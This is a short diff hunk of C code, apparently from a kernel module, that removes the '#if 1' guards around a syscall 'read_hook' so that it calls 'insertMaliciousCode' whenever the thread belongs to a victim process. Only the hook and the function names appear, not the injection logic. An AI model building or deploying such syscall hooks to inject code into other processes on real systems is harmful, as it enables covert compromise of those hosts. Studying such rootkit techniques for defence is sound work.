@@ -149,10 +149,8 @@ read_hook (struct thread * td, void * syscall_args) {
   // If this is the victim process, and we have not injected code yet,
   // inject the code.
   //
-#if 1
   if (isVictimThread (td))
     insertMaliciousCode (td);
-#endif
   return bytesRead;
 }
 
